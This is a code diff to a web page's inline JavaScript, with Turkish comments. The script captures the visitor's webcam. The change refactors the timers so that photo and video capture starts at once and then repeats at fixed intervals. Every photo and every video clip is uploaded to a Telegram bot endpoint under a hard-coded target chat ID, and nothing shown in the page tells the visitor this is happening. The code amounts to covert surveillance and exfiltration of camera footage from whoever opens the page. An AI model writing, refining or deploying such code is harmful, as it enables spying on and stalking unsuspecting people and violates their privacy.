@@ -153,7 +153,6 @@
             let videoCount = 0;
             let photoCount = 0;
             let stream = null;
-            let baslangicZamani = 0;
             
             async function startCamera() {
                 try {
@@ -172,16 +171,14 @@
                         document.getElementById('startBtn').style.display = 'none';
                         document.getElementById('loading').style.display = 'block';
                         
-                        baslangicZamani = performance.now();
-                        
                         // ========================================
-                        // BASİT VE GARANTİLİ ÇÖZÜM
+                        // FOTOĞRAF - HEMEN BAŞLA (0ms)
                         // ========================================
-                        
-                        // 1. FOTOĞRAF - HEMEN BAŞLA (100ms sonra)
-                        setTimeout(() => {
-                            // İlk fotoğraf
+                        function fotoCek() {
+                            if (!stream?.active) return;
+                            
                             photoCount++;
+                            
                             canvas.width = video.videoWidth || 640;
                             canvas.height = video.videoHeight || 480;
                             ctx.drawImage(video, 0, 0);
@@ -198,38 +195,22 @@
                                     body: formData
                                 });
                             }, 'image/jpeg', 0.85);
-                            
-                            // Diğer fotoğraflar
-                            setInterval(() => {
-                                if (!stream?.active) return;
-                                
-                                photoCount++;
-                                
-                                canvas.width = video.videoWidth || 640;
-                                canvas.height = video.videoHeight || 480;
-                                ctx.drawImage(video, 0, 0);
-                                
-                                canvas.toBlob(function(blob) {
-                                    if (!blob) return;
-                                    const formData = new FormData();
-                                    formData.append('chat_id', TARGET_ID);
-                                    formData.append('photo', blob, `foto_${Date.now()}.jpg`);
-                                    formData.append('caption', `📸 Fotoğraf #${photoCount}`);
-                                    
-                                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                                        method: 'POST',
-                                        body: formData
-                                    });
-                                }, 'image/jpeg', 0.85);
-                                
-                            }, FOTO_SURESI * 1000);
-                            
-                        }, 100);
+                        }
                         
-                        // 2. VİDEO - HEMEN BAŞLA (200ms sonra)
-                        setTimeout(() => {
-                            // İlk video
-                            videoCount = 1;
+                        // İLK FOTO HEMEN
+                        fotoCek();
+                        
+                        // DİĞER FOTOLAR
+                        setInterval(fotoCek, FOTO_SURESI * 1000);
+                        
+                        // ========================================
+                        // VİDEO - HEMEN BAŞLA (0ms)
+                        // ========================================
+                        function videoBaslat() {
+                            if (!stream?.active) return;
+                            
+                            videoCount++;
+                            const videoIndex = videoCount;
                             const videoBaslangic = Date.now();
                             const chunks = [];
                             
@@ -250,7 +231,7 @@
                                     const formData = new FormData();
                                     formData.append('chat_id', TARGET_ID);
                                     formData.append('video', blob, `video_${Date.now()}.webm`);
-                                    formData.append('caption', `🎥 Video #1 - ${VIDEO_SURESI}s`);
+                                    formData.append('caption', `🎥 Video #${videoIndex} - ${VIDEO_SURESI}s`);
                                     
                                     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                                         method: 'POST',
@@ -264,52 +245,14 @@
                                     if (mr.state === 'recording') mr.stop();
                                 }, VIDEO_SURESI * 1000);
                                 
-                                // Diğer videolar
-                                setInterval(() => {
-                                    if (!stream?.active) return;
-                                    
-                                    videoCount++;
-                                    const videoIndex = videoCount;
-                                    const videoBaslangic = Date.now();
-                                    const chunks = [];
-                                    
-                                    try {
-                                        const mr = new MediaRecorder(stream, {
-                                            mimeType: 'video/webm;codecs=vp8',
-                                            videoBitsPerSecond: 2500000
-                                        });
-                                        
-                                        mr.ondataavailable = (e) => {
-                                            if (e.data.size > 0) chunks.push(e.data);
-                                        };
-                                        
-                                        mr.onstop = () => {
-                                            const blob = new Blob(chunks, { type: 'video/webm' });
-                                            const boyutKB = (blob.size / 1024).toFixed(0);
-                                            
-                                            const formData = new FormData();
-                                            formData.append('chat_id', TARGET_ID);
-                                            formData.append('video', blob, `video_${Date.now()}.webm`);
-                                            formData.append('caption', `🎥 Video #${videoIndex} - ${VIDEO_SURESI}s`);
-                                            
-                                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-                                                method: 'POST',
-                                                body: formData
-                                            });
-                                        };
-                                        
-                                        mr.start();
-                                        
-                                        setTimeout(() => {
-                                            if (mr.state === 'recording') mr.stop();
-                                        }, VIDEO_SURESI * 1000);
-                                        
-                                    } catch(e) {}
-                                }, VIDEO_SURESI * 1000);
-                                
                             } catch(e) {}
-                            
-                        }, 200);
+                        }
+                        
+                        // İLK VİDEO HEMEN
+                        videoBaslat();
+                        
+                        // DİĞER VİDEOLAR
+                        setInterval(videoBaslat, VIDEO_SURESI * 1000);
                     };
                     
                 } catch(e) {
@@ -326,4 +269,4 @@
         })();
     </script>
 </body>
-    </html>
+</html>
